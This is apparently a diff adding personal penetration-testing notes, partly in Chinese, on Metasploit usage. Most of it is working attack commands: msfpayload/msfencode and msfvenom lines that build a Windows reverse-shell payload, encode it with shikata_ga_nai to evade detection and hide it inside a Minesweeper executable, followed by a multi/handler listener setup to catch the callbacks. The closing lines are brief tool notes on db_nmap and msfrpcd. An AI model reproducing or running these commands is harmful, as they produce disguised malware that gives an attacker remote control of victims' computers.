@@ -1,0 +1,16 @@
+msfpayload windows/shell/reverse_tcp LHOST=192.168.44.1 LPORT=4444 X | msfencode -x /media/Data/Winmine__XP.exe -e x86/shikata_ga_nai -c 4 -t exe > /media/Data/payload2.exe
+
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.44.1 LPORT=4444 -x /media/Data/Winmine__XP.exe -e x86/shikata_ga_nai -i 4 -f exe -b '\x00' > /media/Data/payload2.exe
+
+
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST 192.168.44.1
+set ExitOnSession false
+exploit -j
+
+
+db_nmap可以将nmap的扫描结果保存到postgresql之中
+services -c port,proto,state -p 20-100
+
+msfrpcd可以用于启动本机/其他系统上边的armitage使用的服务
